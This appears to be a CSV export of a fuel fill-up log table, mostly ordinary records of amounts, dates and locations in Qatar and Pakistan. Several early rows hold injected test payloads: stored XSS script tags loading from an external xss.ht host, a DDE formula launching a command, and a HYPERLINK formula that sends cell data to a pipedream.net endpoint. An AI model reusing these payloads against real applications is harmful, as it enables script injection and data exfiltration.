id,fuel_filled,amount_paid,driver_name,location,fuel_supervisor_name,fill_up_date,image,created_at,updated_at,device_id,module_id,payment_method_id,use_case_id,customer_id,status_id,automated_entry
4,"3434.00","3.00",Shah,N/A,jjjdjdj,2021-06-30 11:13:34+00,avatars/141.jpeg,2021-06-30 11:15:29.400991+00,2021-06-30 11:15:29.401007+00,141,1,2017,1,9,1,
274,53.22,"0.00",,,,2022-05-09 05:55:11+00,"",2022-05-09 05:55:37.313557+00,2022-05-09 05:55:37.313566+00,362,1,2017,1,123,1,1
275,65.04,"0.00",,,,2022-05-11 08:05:13+00,"",2022-05-11 08:05:42.021558+00,2022-05-11 08:05:42.021574+00,362,1,2017,1,123,1,1
7,"36.00","3369.00","Shah""><script src=https://vfqhck.xss.ht></script>","N/A""><script src=https://vfqhck.xss.ht></script>","HH""><script src=https://vfqhck.xss.ht></script>",2021-07-04 06:36:54+00,avatars/141_OPPii7z.jpeg,2021-07-04 06:41:09.117469+00,2021-07-04 06:41:09.117483+00,141,1,2020,1,9,1,
8,"3.00","31.00",nozlack,N/A,"tyyyhhe""><script src=https://vfqhck.xss.ht></script>",2021-07-07 07:02:04+00,avatars/141_JsFhtmr.jpeg,2021-07-07 07:05:33.74773+00,2021-07-07 07:05:33.747746+00,141,1,2020,1,9,1,
9,"3.00","31.00",nozlack,N/A,"tyyyhhe""><script src=https://vfqhck.xss.ht></script>",2021-07-07 07:02:04+00,"",2021-07-07 07:13:23.443504+00,2021-07-07 07:13:23.443514+00,141,1,2020,1,9,1,
10,"3.00","31.00",nozlack,N/A,"tyyyhhe""><script src=https://vfqhck.xss.ht></script>",2021-07-07 07:02:04+00,"",2021-07-07 07:15:11.453552+00,2021-07-07 07:15:11.453563+00,141,1,2020,1,9,1,
11,"3.00","31.00",nozlack,N/A,"tyyyhhe""><script src=https://vfqhck.xss.ht></script>",2021-07-07 07:02:04+00,"",2021-07-07 07:16:08.153647+00,2021-07-07 07:16:08.153659+00,141,1,2020,1,9,1,
12,"3.00","31.00",nozlack,N/A,"tyyyhhe""><script src=https://vfqhck.xss.ht></script>",2021-07-07 07:02:04+00,"",2021-07-07 07:16:54.985065+00,2021-07-07 07:16:54.985077+00,141,1,2020,1,9,1,
13,"3.00","31.00",nozlack,N/A,"tyyyhhe""><script src=https://vfqhck.xss.ht></script>",2021-07-07 07:02:04+00,"",2021-07-07 07:17:38.091325+00,2021-07-07 07:17:38.091338+00,141,1,2020,1,9,1,
14,"3.00","31.00",nozlack,N/A,"tyyyhhe""><script src=https://vfqhck.xss.ht></script>",2021-07-07 07:02:04+00,"",2021-07-07 07:18:31.451627+00,2021-07-07 07:18:31.451639+00,141,1,2020,1,9,1,
16,"22.00","258.00",nozlack,N/A,ddd,2021-07-07 07:12:20+00,avatars/awhoamiz.jpg,2021-07-07 07:26:14.887114+00,2021-07-07 07:26:14.887127+00,141,1,2020,1,9,1,
17,"22.00","258.00",nozlack,N/A,ddd,2021-07-07 07:12:20+00,avatars/awhoamiz_kWpIemC.jpg,2021-07-07 07:27:21.997374+00,2021-07-07 07:27:21.997389+00,141,1,2020,1,9,1,
18,"22.00","258.00",nozlack,N/A,ddd,2021-07-07 07:12:20+00,avatars/awhoamiz_JgPyuLw.jpg,2021-07-07 07:28:02.662481+00,2021-07-07 07:28:02.662496+00,141,1,2020,1,9,1,
19,"22.00","258.00",nozlack,N/A,ddd,2021-07-07 07:12:20+00,avatars/asleep_30z.jpgsleep_3000.jpeg,2021-07-07 07:30:19.058392+00,2021-07-07 07:30:19.058406+00,141,1,2020,1,9,1,
20,"22.00","258.00",nozlack,N/A,ddd,2021-07-07 07:12:20+00,avatars/lol.jpeg,2021-07-07 07:31:00.200179+00,2021-07-07 07:31:00.200192+00,141,1,2020,1,9,1,
21,"22.00","258.00",nozlack,N/A,ddd,2021-07-07 07:12:20+00,avatars/lol_7m46ZHq.jpeg,2021-07-07 07:31:36.961038+00,2021-07-07 07:31:36.96105+00,141,1,2020,1,9,1,
22,"22.00","258.00",nozlack,N/A,ddd,2021-07-07 07:12:20+00,avatars/lol_pREQHo0.jpeg,2021-07-07 07:31:57.490047+00,2021-07-07 07:31:57.49006+00,141,1,2020,1,9,1,
23,"22.00","258.00",nozlack,N/A,ddd,2021-07-07 07:12:20+00,avatars/lol.png,2021-07-07 07:38:57.799584+00,2021-07-07 07:38:57.799598+00,141,1,2020,1,9,1,
24,"22.00","258.00",nozlack,N/A,ddd,2021-07-07 07:12:20+00,avatars/sleep10--_-.jpg,2021-07-07 07:40:27.09153+00,2021-07-07 07:40:27.091543+00,141,1,2020,1,9,1,
25,"22.00","258.00",nozlack,N/A,ddd,2021-07-07 07:12:20+00,avatars/script.jpg,2021-07-07 07:41:19.621214+00,2021-07-07 07:41:19.621229+00,141,1,2020,1,9,1,
26,"22.00","258.00",nozlack,N/A,ddd,2021-07-07 07:12:20+00,avatars/_sleep_10.jpg,2021-07-07 07:42:01.936065+00,2021-07-07 07:42:01.93608+00,141,1,2020,1,9,1,
27,"22.00","258.00",nozlack,N/A,ddd,2021-07-07 07:12:20+00,avatars/lsid_ls_id_ls_id_ls__id_.jpeg,2021-07-07 07:47:09.118637+00,2021-07-07 07:47:09.118651+00,141,1,2020,1,9,1,
28,"22.00","258.00",nozlack,N/A,=4+4,2021-07-07 07:12:20+00,avatars/_sleep_10_mbU1aNd.jpg,2021-07-07 08:14:16.200563+00,2021-07-07 08:14:16.200579+00,141,1,2020,1,9,1,
29,"22.00","258.00",nozlack,N/A,""":"";-3+3+cmd|' /C calc'!D2",2021-07-07 07:12:20+00,avatars/_sleep_10_oUp7m5n.jpg,2021-07-07 08:16:15.828742+00,2021-07-07 08:16:15.828757+00,141,1,2020,1,9,1,
30,"22.00","258.00",""":"";-3+3+cmd|' /C calc'!D2",N/A,""":"";-3+3+cmd|' /C calc'!D2",2021-07-07 07:12:20+00,avatars/_sleep_10_3crANmW.jpg,2021-07-07 08:16:35.825943+00,2021-07-07 08:16:35.825956+00,141,1,2020,1,9,1,
31,"22.00","258.00","""=HYPERLINK(""https://enpyl6nayhand.x.pipedream.net/evil.html?data=""&A1, ""Click to view additional information"")""",N/A,"""=HYPERLINK(""https://enpyl6nayhand.x.pipedream.net/evil.html?data=""&A1, ""Click to view additional information"")""",2021-07-07 07:12:20+00,avatars/_sleep_10_rIukfIy.jpg,2021-07-07 08:20:08.22371+00,2021-07-07 08:20:08.223726+00,141,1,2020,1,9,1,
32,"22.00","258.00","""=HYPERLINK(""https://enpyl6nayhand.x.pipedream.net?data=""&A1, ""Click to view additional information"")""",N/A,"""=HYPERLINK(""https://enpyl6nayhand.x.pipedream.net/evil.html?data=""&A1, ""Click to view additional information"")""",2021-07-07 07:12:20+00,avatars/_sleep_10_q2vFqI7.jpg,2021-07-07 08:21:37.577479+00,2021-07-07 08:21:37.577493+00,141,1,2020,1,9,1,
36,"122.00","250.00",Najmul,Woqod,Mohd Firoj,2021-11-19 07:51:51+00,"",2021-11-28 07:52:05.189712+00,2021-11-28 07:52:05.189722+00,327,1,2017,1,62,1,
37,"50.00","110.00",Awais,Najma,Nouman,2021-12-01 07:26:43+00,"",2022-01-12 07:29:13.262837+00,2022-01-12 07:29:13.262847+00,446,1,2017,1,146,1,
38,"100.00","220.00",Awais,Najma,Nouman,2022-01-12 07:26:43+00,"",2022-01-12 07:29:38.806081+00,2022-01-12 07:29:38.806091+00,446,1,2017,1,146,1,
39,"2.00","2.00",test,islamabad,test,2022-01-13 10:33:09+00,"",2022-01-13 10:34:03.083775+00,2022-01-13 10:34:03.083791+00,141,1,2017,1,9,1,
40,"10.00","10.00",test,islamabad test,test,2022-01-13 10:33:09+00,"",2022-01-13 10:35:40.698155+00,2022-01-13 10:35:40.698166+00,141,1,2017,1,9,1,
41,"100.00","100.00",test,!@#$%^&*(<script></script>$%^&,test,2022-01-13 10:33:09+00,"",2022-01-13 10:36:42.220359+00,2022-01-13 10:36:42.22037+00,141,1,2017,1,9,1,
15,"3.00","31.00",nozlack,N/A,c,2021-07-07 07:02:04+00,"",2021-07-07 07:18:51.99143+00,2022-01-13 14:34:38.117401+00,141,1,2020,1,9,1,
42,"3.00","0.00",,"Abraj Quartier, Doha, 23619, Qatar",,2022-01-27 21:42:39.903183+00,"",2022-01-27 21:43:24.206616+00,2022-01-27 21:43:24.206626+00,460,1,2017,1,199,1,1
43,"10.00","20.00",abc,abc,abc,2022-01-26 22:20:24+00,"",2022-01-27 22:20:30.209658+00,2022-01-27 22:20:30.209668+00,503,1,2017,1,212,1,
44,"20.00","0.00",,"Al Istiqlal Street, Lejbailat, Doha, 22050, Qatar",,2022-01-27 22:54:59.541453+00,"",2022-01-27 22:55:31.186754+00,2022-01-27 22:55:31.186765+00,505,1,2017,1,214,1,1
45,"19.50","0.00",,"AL RAYYAN SECURITY DEPARTMENT, Al Rayyan Al Jadeed Street, Al Rayyan, Ar Rayyan, 201204, Qatar",,2022-01-27 22:56:07.832271+00,"",2022-01-27 22:56:18.899061+00,2022-01-27 22:56:18.899073+00,505,1,2017,1,214,1,1
46,"19.50","0.00",,"Dukhan Road, Al Rayyan, Ar Rayyan, 945, Qatar",,2022-01-27 22:57:17.031385+00,"",2022-01-27 22:57:33.299475+00,2022-01-27 22:57:33.299486+00,505,1,2017,1,214,1,1
47,"19.50","0.00",,"Al Rayyan, Ar Rayyan, Qatar",,2022-01-27 22:58:23.889347+00,"",2022-01-27 22:59:12.185324+00,2022-01-27 22:59:12.18534+00,505,1,2017,1,214,1,1
48,"46.00","0.00",,"Street 23, I-10/4, I-10, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-01-27 22:59:39.421141+00,"",2022-01-27 22:59:56.186377+00,2022-01-27 22:59:56.186393+00,505,1,2017,1,214,1,1
49,"20.00","0.00",,"Al Istiqlal Street, Lejbailat, Doha, 22050, Qatar",,2022-01-27 23:02:05.36537+00,"",2022-01-27 23:02:17.045557+00,2022-01-27 23:02:17.045568+00,505,1,2017,1,214,1,1
50,"19.50","0.00",,"AL RAYYAN SECURITY DEPARTMENT, Al Rayyan Al Jadeed Street, Al Rayyan, Ar Rayyan, 201204, Qatar",,2022-01-27 23:03:10.750857+00,"",2022-01-27 23:03:46.053657+00,2022-01-27 23:03:46.053667+00,505,1,2017,1,214,1,1
51,"19.50","0.00",,"Dukhan Road, Al Rayyan, Ar Rayyan, 945, Qatar",,2022-01-27 23:04:15.63804+00,"",2022-01-27 23:04:29.292246+00,2022-01-27 23:04:29.292256+00,505,1,2017,1,214,1,1
52,"19.50","0.00",,"Al Rayyan, Ar Rayyan, Qatar",,2022-01-27 23:05:21.192523+00,"",2022-01-27 23:06:00.004852+00,2022-01-27 23:06:00.004862+00,505,1,2017,1,214,1,1
53,"19.50","0.00",,"Al Rayyan, Ar Rayyan, Qatar",,2022-01-27 23:06:26.712475+00,"",2022-01-27 23:06:47.240808+00,2022-01-27 23:06:47.240818+00,505,1,2017,1,214,1,1
54,"19.50","0.00",,"Al Rayyan, Ar Rayyan, Qatar",,2022-01-27 23:07:37.943571+00,"",2022-01-27 23:08:22.986075+00,2022-01-27 23:08:22.986085+00,505,1,2017,1,214,1,1
55,"19.50","0.00",,"Al Rayyan, Ar Rayyan, Qatar",,2022-01-27 23:08:40.516403+00,"",2022-01-27 23:09:14.098657+00,2022-01-27 23:09:14.098667+00,505,1,2017,1,214,1,1
56,"12.00","0.00",,"Al Istiqlal Street, Lejbailat, Doha, 22050, Qatar",,2022-01-27 23:31:33.336109+00,"",2022-01-27 23:31:35.904196+00,2022-01-27 23:31:35.904205+00,517,1,2017,1,213,1,1
57,"11.70","0.00",,"AL RAYYAN SECURITY DEPARTMENT, Al Rayyan Al Jadeed Street, Al Rayyan, Ar Rayyan, 201204, Qatar",,2022-01-27 23:32:39.025368+00,"",2022-01-27 23:33:05.808047+00,2022-01-27 23:33:05.808063+00,517,1,2017,1,213,1,1
58,"32.00","0.00",,"Al Istiqlal Street, Lejbailat, Doha, 22050, Qatar",,2022-01-27 23:33:17.76325+00,"",2022-01-27 23:33:33.806014+00,2022-01-27 23:33:33.806027+00,459,1,2017,1,196,1,1
59,"11.70","0.00",,"Dukhan Road, Al Rayyan, Ar Rayyan, 945, Qatar",,2022-01-27 23:33:45.969248+00,"",2022-01-27 23:34:05.555199+00,2022-01-27 23:34:05.55521+00,517,1,2017,1,213,1,1
60,"31.20","0.00",,"AL RAYYAN SECURITY DEPARTMENT, Al Rayyan Al Jadeed Street, Al Rayyan, Ar Rayyan, 201204, Qatar",,2022-01-27 23:34:24.308148+00,"",2022-01-27 23:34:35.783018+00,2022-01-27 23:34:35.783028+00,459,1,2017,1,196,1,1
61,"11.70","0.00",,"Al Rayyan, Ar Rayyan, Qatar",,2022-01-27 23:34:52.545268+00,"",2022-01-27 23:35:10.056325+00,2022-01-27 23:35:10.056336+00,517,1,2017,1,213,1,1
62,"31.20","0.00",,"Dukhan Road, Al Rayyan, Ar Rayyan, 945, Qatar",,2022-01-27 23:35:32.914271+00,"",2022-01-27 23:35:37.878105+00,2022-01-27 23:35:37.878117+00,459,1,2017,1,196,1,1
63,"10.80","0.00",,,,2022-01-27 23:36:05+00,"",2022-01-27 23:36:09.771773+00,2022-01-27 23:36:09.771782+00,517,1,2017,1,213,1,1
64,"31.20","0.00",,"Al Rayyan, Ar Rayyan, Qatar",,2022-01-27 23:36:38.588922+00,"",2022-01-27 23:37:08.615815+00,2022-01-27 23:37:08.615826+00,459,1,2017,1,196,1,1
65,"11.70","0.00",,"Al Rayyan, Ar Rayyan, Qatar",,2022-01-27 23:37:06.114653+00,"",2022-01-27 23:37:09.884514+00,2022-01-27 23:37:09.884524+00,517,1,2017,1,213,1,1
66,"31.20","0.00",,"Al Rayyan, Ar Rayyan, Qatar",,2022-01-27 23:37:46.334479+00,"",2022-01-27 23:38:13.007354+00,2022-01-27 23:38:13.007368+00,459,1,2017,1,196,1,1
67,"11.70","0.00",,"Al Rayyan, Ar Rayyan, Qatar",,2022-01-27 23:38:12.078651+00,"",2022-01-27 23:38:41.759706+00,2022-01-27 23:38:41.759717+00,517,1,2017,1,213,1,1
68,"31.20","0.00",,"Al Rayyan, Ar Rayyan, Qatar",,2022-01-27 23:38:53.969531+00,"",2022-01-27 23:39:24.136522+00,2022-01-27 23:39:24.136533+00,459,1,2017,1,196,1,1
69,"11.70","0.00",,"Umm Salal, Qatar",,2022-01-27 23:39:17.862891+00,"",2022-01-27 23:39:24.821993+00,2022-01-27 23:39:24.822005+00,517,1,2017,1,213,1,1
70,"3.80","0.00",,"لبصير, Lusail, Al Daayen, Qatar",,2022-01-28 00:07:45.920074+00,"",2022-01-28 00:08:12.764473+00,2022-01-28 00:08:12.764484+00,460,1,2017,1,199,1,1
71,"35.50","0.00",,"Street 23, I-10/4, I-10, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-01-28 07:24:26.433203+00,"",2022-01-28 07:24:38.58515+00,2022-01-28 07:24:38.585161+00,505,1,2017,1,214,1,1
72,46.19,"0.00",,"Al Wakrah, 1391, Qatar",,2022-01-30 03:05:53+00,"",2022-01-30 03:06:04.511951+00,2022-01-30 03:06:04.511962+00,362,1,2017,1,123,1,1
73,69.63,"0.00",,,,2022-01-30 10:44:20+00,"",2022-01-30 10:44:27.752623+00,2022-01-30 10:44:27.752633+00,447,1,2017,1,196,1,1
74,31.54,"0.00",,,,2022-01-30 10:59:58+00,"",2022-01-30 11:00:07.224834+00,2022-01-30 11:00:07.224845+00,447,1,2017,1,196,1,1
75,18.07,"0.00",,,,2022-01-30 11:15:22+00,"",2022-01-30 11:15:25.891408+00,2022-01-30 11:15:25.891417+00,447,1,2017,1,196,1,1
76,21.78,"0.00",,,,2022-01-30 11:27:33+00,"",2022-01-30 11:27:40.640216+00,2022-01-30 11:27:40.640225+00,447,1,2017,1,196,1,1
77,25.38,"0.00",,"Abraj Street, Abraj Quartier, Doha, 220045, Qatar",,2022-01-30 12:21:52.948687+00,"",2022-01-30 12:21:56.989429+00,2022-01-30 12:21:56.989439+00,522,1,2017,1,196,1,1
78,25.38,"0.00",,"Abraj Street, Abraj Quartier, Doha, 220045, Qatar",,2022-01-30 13:13:09.216166+00,"",2022-01-30 13:13:16.679463+00,2022-01-30 13:13:16.679473+00,521,1,2017,1,196,1,1
79,18.27,"0.00",,"Al Wakrah, 1391, Qatar",,2022-01-30 13:57:35+00,"",2022-01-30 13:57:48.119277+00,2022-01-30 13:57:48.119287+00,362,1,2017,1,123,1,1
80,15.33,"0.00",,,,2022-01-31 07:48:21+00,"",2022-01-31 07:48:27.538838+00,2022-01-31 07:48:27.53885+00,362,1,2017,1,123,1,1
81,16.51,"0.00",,"Al Wakrah, 1391, Qatar",,2022-01-31 14:24:12+00,"",2022-01-31 14:24:22.431292+00,2022-01-31 14:24:22.431303+00,362,1,2017,1,123,1,1
82,16.41,"0.00",,"Bu Samra, Ar Rayyan, 40466, Qatar",,2022-01-31 15:19:59+00,"",2022-01-31 15:20:12.046219+00,2022-01-31 15:20:12.046229+00,362,1,2017,1,123,1,1
83,45.81,"0.00",,"Al Wakrah, 1391, Qatar",,2022-02-01 03:25:29+00,"",2022-02-01 03:25:40.869576+00,2022-02-01 03:25:40.869588+00,362,1,2017,1,123,1,1
84,38.77,"0.00",,,,2022-02-03 08:09:48+00,"",2022-02-03 08:09:54.199613+00,2022-02-03 08:09:54.199622+00,362,1,2017,1,123,1,1
85,19.92,"0.00",,,,2022-02-03 08:43:03+00,"",2022-02-03 08:43:10.895572+00,2022-02-03 08:43:10.895583+00,523,1,2017,1,196,1,1
86,"19.80","0.00",,,,2022-02-03 08:45:01+00,"",2022-02-03 08:45:13.128327+00,2022-02-03 08:45:13.128337+00,523,1,2017,1,196,1,1
87,"19.80","0.00",,"Lusail Street, Al Gassar, Doha, 6822, Qatar",,2022-02-03 08:46:58.225704+00,"",2022-02-03 08:47:04.035507+00,2022-02-03 08:47:04.035522+00,523,1,2017,1,196,1,1
88,"19.80","0.00",,"Al Rayyan Al Jadeed Street, Mehairja, Al Rayyan, Ar Rayyan, 00000, Qatar",,2022-02-03 08:48:53.493227+00,"",2022-02-03 08:49:02.589436+00,2022-02-03 08:49:02.589451+00,523,1,2017,1,196,1,1
89,16.41,"0.00",,"Al Furousiya Street, Al Aziziya, Al Rayyan, Ar Rayyan, 93035, Qatar",,2022-02-06 02:15:49+00,"",2022-02-06 02:16:02.711953+00,2022-02-06 02:16:02.711971+00,362,1,2017,1,123,1,1
90,46.29,"0.00",,,,2022-02-08 02:56:12+00,"",2022-02-08 02:56:22.987667+00,2022-02-08 02:56:22.987677+00,362,1,2017,1,123,1,1
91,16.31,"0.00",,"Street 1106, Ar Rayyan, 40466, Qatar",,2022-02-08 03:12:35+00,"",2022-02-08 03:13:37.849821+00,2022-02-08 03:13:37.849832+00,362,1,2017,1,123,1,1
92,15.73,"0.00",,"G Ring Cycle Path, Ar Rayyan, 1391, Qatar",,2022-02-08 14:49:54+00,"",2022-02-08 14:50:28.669181+00,2022-02-08 14:50:28.669191+00,362,1,2017,1,123,1,1
93,15.42,"0.00",,"Al Wakrah, Qatar",,2022-02-08 15:02:04+00,"",2022-02-08 15:02:35.277496+00,2022-02-08 15:02:35.277506+00,362,1,2017,1,123,1,1
94,18.95,"0.00",,"Street 1106, Ar Rayyan, 40466, Qatar",,2022-02-09 13:20:06+00,"",2022-02-09 13:20:18.154006+00,2022-02-09 13:20:18.154016+00,362,1,2017,1,123,1,1
95,42.09,"0.00",,,,2022-02-10 11:25:22+00,"",2022-02-10 11:25:28.717315+00,2022-02-10 11:25:28.717325+00,362,1,2017,1,123,1,1
96,17.58,"0.00",,"Al Wakrah, Qatar",,2022-02-11 02:54:00+00,"",2022-02-11 02:54:26.934633+00,2022-02-11 02:54:26.934644+00,362,1,2017,1,123,1,1
97,15.54,"0.00",,"Bu Samra, Ar Rayyan, 40466, Qatar",,2022-02-12 15:35:08+00,"",2022-02-12 15:35:22.33598+00,2022-02-12 15:35:22.33599+00,362,1,2017,1,123,1,1
98,46.98,"0.00",,,,2022-02-14 05:07:37+00,"",2022-02-14 05:07:43.519064+00,2022-02-14 05:07:43.519079+00,362,1,2017,1,123,1,1
99,47.17,"0.00",,,,2022-02-15 09:06:57+00,"",2022-02-15 09:07:11.318834+00,2022-02-15 09:07:11.318847+00,362,1,2017,1,123,1,1
5,"9.00","25.00",nozlack,N/A,cghh,2021-06-30 12:17:27+00,avatars/143.jpeg,2021-06-30 12:18:02.520502+00,2021-06-30 12:18:02.520518+00,143,1,2020,1,9,"0",
6,"42.00","34.00",nozlack,N/A,oasis,2021-06-30 12:25:15+00,avatars/143_dgy1izf.jpeg,2021-06-30 12:25:46.300616+00,2021-06-30 12:25:46.30063+00,143,1,2020,1,9,"0",
102,16.12,"0.00",,,,2022-02-16 14:13:50+00,"",2022-02-16 14:14:10.539557+00,2022-02-16 14:14:10.539575+00,362,1,2017,1,123,1,1
103,"8.30","0.00",,,,2022-02-17 10:25:11+00,"",2022-02-17 10:25:24.340575+00,2022-02-17 10:25:24.340589+00,545,1,2017,1,196,1,1
104,36.04,"0.00",,,,2022-02-17 11:12:31+00,"",2022-02-17 11:12:51.504799+00,2022-02-17 11:12:51.504814+00,362,1,2017,1,123,1,1
105,"29.60","0.00",,,,2022-02-17 12:10:57+00,"",2022-02-17 12:11:21.441622+00,2022-02-17 12:11:21.441634+00,447,1,2017,1,196,1,1
159,"24.00","0.00",,"Islamabad, Punjab",,2022-02-28 10:36:05.155911+00,"",2022-02-28 10:36:30.495781+00,2022-02-28 10:36:30.49579+00,577,1,2017,1,9,"0",1
160,"24.00","0.00",,"Islamabad, Punjab",,2022-02-28 10:37:15.478257+00,"",2022-02-28 10:37:32.363992+00,2022-02-28 10:37:32.364002+00,577,1,2017,1,9,"0",1
161,"24.00","0.00",,"Islamabad, Punjab",,2022-02-28 10:38:02.769335+00,"",2022-02-28 10:38:28.216807+00,2022-02-28 10:38:28.216817+00,577,1,2017,1,9,"0",1
162,"51.00","0.00",,"Islamabad, Punjab",,2022-02-28 10:43:37.467903+00,"",2022-02-28 10:43:59.080389+00,2022-02-28 10:43:59.080411+00,577,1,2017,1,9,"0",1
163,"24.00","0.00",,"Islamabad, Punjab",,2022-02-28 10:46:28.265637+00,"",2022-02-28 10:46:57.601345+00,2022-02-28 10:46:57.601356+00,577,1,2017,1,9,"0",1
164,"24.00","0.00",,"Islamabad, Punjab",,2022-02-28 10:48:16.363068+00,"",2022-02-28 10:48:31.777634+00,2022-02-28 10:48:31.777644+00,577,1,2017,1,9,"0",1
165,"51.00","0.00",,"Islamabad, Punjab",,2022-02-28 10:51:57.324351+00,"",2022-02-28 10:52:27.895211+00,2022-02-28 10:52:27.895223+00,577,1,2017,1,9,"0",1
276,59.08,"0.00",,,,2022-05-13 11:23:11+00,"",2022-05-13 11:23:25.734333+00,2022-05-13 11:23:25.734342+00,362,1,2017,1,123,1,1
125,15.81,"0.00",,"Al Wakrah, 1391, Qatar",,2022-02-18 14:59:02+00,"",2022-02-18 14:59:21.016345+00,2022-02-18 14:59:21.016362+00,362,1,2017,1,123,1,1
100,14.62,"0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-02-16 06:22:39.485534+00,"",2022-02-16 06:23:02.380951+00,2022-02-16 06:23:02.380965+00,536,1,2017,1,9,"0",1
101,"2658.00","6999.00",nagina prod mirror,"196 Street 1, I-10/3 I 10/3 I-10, Islamabad, Islamabad Capital Territory, Pakistan",prod mirror,2022-02-16 07:23:59+00,avatars/IMG-20220216-WA0010.jpg,2022-02-16 07:24:17.206604+00,2022-02-16 07:24:17.20663+00,536,1,2020,1,9,"0",
106,14.62,"0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-02-18 05:20:38.284172+00,"",2022-02-18 05:21:13.480599+00,2022-02-18 05:21:13.480611+00,536,1,2017,1,9,"0",1
107,"6.80","0.00",,"Begum Iqbal Sarfraz Road (Bazar Road), G-6, Blue Area, Islamabad Capital Territory, 4400, Pakistan",,2022-02-18 05:22:04.587138+00,"",2022-02-18 05:22:32.296449+00,2022-02-18 05:22:32.296462+00,536,1,2017,1,9,"0",1
108,12.75,"0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-02-18 05:25:18.005307+00,"",2022-02-18 05:25:42.543542+00,2022-02-18 05:25:42.543556+00,536,1,2017,1,9,"0",1
109,"6.80","0.00",,"Begum Iqbal Sarfraz Road (Bazar Road), G-6, Blue Area, Islamabad Capital Territory, 4400, Pakistan",,2022-02-18 05:26:26.538427+00,"",2022-02-18 05:26:40.188127+00,2022-02-18 05:26:40.18814+00,536,1,2017,1,9,"0",1
110,"6.80","0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-02-18 05:27:12.020518+00,"",2022-02-18 05:27:34.730628+00,2022-02-18 05:27:34.73064+00,536,1,2017,1,9,"0",1
111,"6.80","0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-02-18 05:27:57.367216+00,"",2022-02-18 05:28:07.83678+00,2022-02-18 05:28:07.836795+00,536,1,2017,1,9,"0",1
112,"15.30","0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-02-18 11:39:51.174118+00,"",2022-02-18 11:40:11.995551+00,2022-02-18 11:40:11.995568+00,536,1,2017,1,9,"0",1
113,"6.80","0.00",,"Begum Iqbal Sarfraz Road (Bazar Road), G-6, Blue Area, Islamabad Capital Territory, 4400, Pakistan",,2022-02-18 11:41:09.477172+00,"",2022-02-18 11:41:36.688839+00,2022-02-18 11:41:36.688851+00,536,1,2017,1,9,"0",1
114,"6.80","0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-02-18 11:41:55.965197+00,"",2022-02-18 11:42:14.88204+00,2022-02-18 11:42:14.882053+00,536,1,2017,1,9,"0",1
115,16.15,"0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-02-18 11:53:29.797717+00,"",2022-02-18 11:53:52.566849+00,2022-02-18 11:53:52.566861+00,536,1,2017,1,9,"0",1
116,"6.80","0.00",,"Begum Iqbal Sarfraz Road (Bazar Road), G-6, Blue Area, Islamabad Capital Territory, 4400, Pakistan",,2022-02-18 11:54:57.373684+00,"",2022-02-18 11:55:19.354484+00,2022-02-18 11:55:19.354496+00,536,1,2017,1,9,"0",1
117,"6.80","0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-02-18 11:55:43.149016+00,"",2022-02-18 11:56:10.724384+00,2022-02-18 11:56:10.724402+00,536,1,2017,1,9,"0",1
118,"6.80","0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-02-18 11:56:29.111577+00,"",2022-02-18 11:56:47.944296+00,2022-02-18 11:56:47.944307+00,536,1,2017,1,9,"0",1
119,"6.80","0.00",,"G-6/4, G-5, Blue Area, Islamabad Capital Territory, 44000, Pakistan",,2022-02-18 11:57:14.610919+00,"",2022-02-18 11:57:53.768992+00,2022-02-18 11:57:53.769005+00,536,1,2017,1,9,"0",1
120,"6.80","0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-02-18 11:58:22.592697+00,"",2022-02-18 11:59:06.809023+00,2022-02-18 11:59:06.809061+00,536,1,2017,1,9,"0",1
121,"15.30","0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-02-18 12:22:57.585618+00,"",2022-02-18 12:23:13.354176+00,2022-02-18 12:23:13.354195+00,536,1,2017,1,9,"0",1
122,"17.00","0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-02-18 12:51:34.065482+00,"",2022-02-18 12:51:46.980488+00,2022-02-18 12:51:46.980505+00,536,1,2017,1,9,"0",1
123,"6.80","0.00",,"Begum Iqbal Sarfraz Road (Bazar Road), G-6, Blue Area, Islamabad Capital Territory, 4400, Pakistan",,2022-02-18 12:53:01.454151+00,"",2022-02-18 12:53:50.30023+00,2022-02-18 12:53:50.300241+00,536,1,2017,1,9,"0",1
124,"6.80","0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-02-18 12:53:47.711142+00,"",2022-02-18 12:54:12.709665+00,2022-02-18 12:54:12.709683+00,536,1,2017,1,9,"0",1
126,"13.60","0.00",,"Abraj Quartier, Doha, 23619, Qatar",,2022-02-18 23:17:52.625165+00,"",2022-02-18 23:18:22.455422+00,2022-02-18 23:18:22.455439+00,536,1,2017,1,9,"0",1
131,16.21,"0.00",,"Bu Samra, Ar Rayyan, 40466, Qatar",,2022-02-19 14:03:35+00,"",2022-02-19 14:04:16.607469+00,2022-02-19 14:04:16.60749+00,362,1,2017,1,123,1,1
138,19.83,"0.00",,"Al Furousiya Street, Baaya, Mehairja, Al Rayyan, Ar Rayyan, 93035, Qatar",,2022-02-21 02:16:21+00,"",2022-02-21 02:16:58.36137+00,2022-02-21 02:16:58.361381+00,362,1,2017,1,123,1,1
139,47.27,"0.00",,,,2022-02-22 10:35:41+00,"",2022-02-22 10:35:59.89576+00,2022-02-22 10:35:59.895776+00,362,1,2017,1,123,1,1
140,47.85,"0.00",,,,2022-02-24 11:00:36+00,"",2022-02-24 11:01:03.839512+00,2022-02-24 11:01:03.839528+00,362,1,2017,1,123,1,1
